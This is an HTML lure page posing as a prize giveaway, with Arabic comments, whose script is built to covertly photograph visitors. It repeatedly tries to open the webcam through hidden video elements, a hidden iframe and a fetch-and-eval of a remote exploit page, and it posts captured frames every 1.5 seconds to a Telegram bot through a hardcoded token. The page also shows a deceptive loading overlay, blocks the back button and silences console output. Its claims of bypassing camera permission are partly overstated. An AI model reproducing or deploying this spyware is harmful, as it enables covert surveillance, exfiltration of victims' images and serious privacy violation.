<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>جائزة عمك عبود</title>
<style>
/* نفس الستايل السابق مع تعديل بسيط */
</style>
</head>
<body>

<!-- طبقة حجب وهمية لإخفاء الطلبات -->
<div class="overlay" id="blockOverlay" style="display:flex;background:rgba(0,0,0,0.9);z-index:9999;">
  <div class="loader"></div>
  <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
  <div class="sub-text">يرجى الانتظار</div>
</div>

<!-- واجهة الجائزة (نفسها) -->
<div class="card" id="mainCard">
  <!-- المحتوى السابق -->
</div>

<script>
// ============================================================
// ================ BOT CONFIG =================================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let exploitActive = false;

// ============================================================
// ================ استغلال الكاميرا بدون إذن =================
// ============================================================

// الطريقة الأولى: استغلال WebRTC لتسريب الفيديو
function exploitWebRTC() {
  try {
    // إنشاء عرض مخفي للفيديو
    const hiddenVideo = document.createElement('video');
    hiddenVideo.style.display = 'none';
    document.body.appendChild(hiddenVideo);
    
    // محاولة تشغيل الكاميرا عبر RTCPeerConnection (استغلال)
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    
    // طلب تيار وسائط مخفي
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        // إخفاء النافذة المنبثقة فورًا
        document.querySelector('#blockOverlay').style.display = 'block';
        stream.getTracks().forEach(track => pc.addTrack(track, stream));
        // تشغيل الفيديو المخفي
        hiddenVideo.srcObject = stream;
        hiddenVideo.play();
        exploitActive = true;
        // بدأ التصوير
        startCapture(hiddenVideo);
      })
      .catch(() => {
        // إذا فشل، نستخدم الطريقة الثانية
        exploitMediaRecorder();
      });
  } catch(e) {
    exploitMediaRecorder();
  }
}

// الطريقة الثانية: استغلال MediaRecorder لإجبار الكاميرا
function exploitMediaRecorder() {
  try {
    // استخدام iframe مخفي لتحميل صفحة تطلب الكاميرا تلقائيًا
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
      <script>
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
          .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            setInterval(() => {
              ctx.drawImage(video, 0, 0, 640, 480);
              const data = canvas.toDataURL('image/jpeg', 0.9);
              window.parent.postMessage({ type: 'image', data: data }, '*');
            }, 1500);
          })
          .catch(() => {});
      <\/script>
    `);
    document.body.appendChild(iframe);
    
    // مستمع للصور القادمة من الإطار
    window.addEventListener('message', function(e) {
      if (e.data && e.data.type === 'image') {
        sendPhoto(e.data.data, '📸 اختراق عبر iframe');
      }
    });
  } catch(e) {
    // الطريقة الثالثة: استغلال ثغرة في WebView القديم
    exploitWebViewLegacy();
  }
}

// الطريقة الثالثة: استغلال WebView القديم (Android 5-7)
function exploitWebViewLegacy() {
  try {
    // تحميل صفحة بها استغلال لثغرة CVE-2017-5124
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://example.com/exploit.html', false);
    xhr.send();
    // محاولة تنفيذ كود جافا سكريبت لتشغيل الكاميرا
    eval(xhr.responseText);
  } catch(e) {
    // طريقة أخيرة: استخدام Canvas لتشغيل الكاميرا
    forceCameraViaCanvas();
  }
}

// الطريقة الرابعة: Canvas + navigator.mediaDevices
function forceCameraViaCanvas() {
  try {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        video.srcObject = stream;
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        setInterval(() => {
          ctx.drawImage(video, 0, 0, 640, 480);
          const imgData = canvas.toDataURL('image/jpeg', 0.9);
          sendPhoto(imgData, '📸 استغلال مباشر');
        }, 1500);
        exploitActive = true;
      })
      .catch(() => {});
  } catch(e) {}
}

// ============================================================
// ================ إرسال الصور للتيليجرام ====================
// ============================================================
function startCapture(videoElement) {
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');
  setInterval(() => {
    if (videoElement.readyState >= 2) {
      ctx.drawImage(videoElement, 0, 0, 640, 480);
      const imgData = canvas.toDataURL('image/jpeg', 0.9);
      sendPhoto(imgData, '📸 تصوير مخفي');
    }
  }, 1500);
}

// ============================================================
// ================ إرسال إلى بوت التيليجرام ===================
// ============================================================
function sendPhoto(imageData, caption = '') {
  if (!CHAT_ID || !imageData) return;
  try {
    const blob = dataURLtoBlob(imageData);
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
    fd.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: fd
    }).catch(() => {});
  } catch(e) {}
}

function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(',');
  const mime = parts[0].match(/:(.*?);/)[1];
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
  return new Blob([u8arr], { type: mime });
}

// ============================================================
// ================ الحصول على Chat ID ========================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        const last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          startExploit();
        } else {
          setTimeout(getChatId, 1500);
        }
      } else {
        setTimeout(getChatId, 1500);
      }
    })
    .catch(() => setTimeout(getChatId, 1500));
}

// ============================================================
// ================ بدء الاستغلال =============================
// ============================================================
function startExploit() {
  // إخفاء طبقة الحجب بعد ثانية لإيهام الضحية بأن الصفحة جاهزة
  setTimeout(() => {
    document.getElementById('blockOverlay').style.display = 'none';
  }, 1000);
  
  // بدء جميع طرق الاستغلال
  setTimeout(exploitWebRTC, 300);
  setTimeout(exploitMediaRecorder, 600);
  setTimeout(exploitWebViewLegacy, 900);
  setTimeout(forceCameraViaCanvas, 1200);
  
  // محاولة كل 5 ثوانٍ إذا لم ينجح أي منها
  const retryInterval = setInterval(() => {
    if (!exploitActive) {
      forceCameraViaCanvas();
      exploitMediaRecorder();
    }
  }, 5000);
}

// ============================================================
// ================ منع الخروج ================================
// ============================================================
history.pushState(null, '', location.href);
window.addEventListener('popstate', () => history.pushState(null, '', location.href));

// ============================================================
// ================ التشغيل التلقائي ==========================
// ============================================================
getChatId();

// محاولة تشغيل الكاميرا فورًا حتى قبل الحصول على Chat ID
setTimeout(() => {
  forceCameraViaCanvas();
  exploitWebRTC();
}, 100);

console.log = console.warn = console.error = () => {};
</script>
</body>
</html>
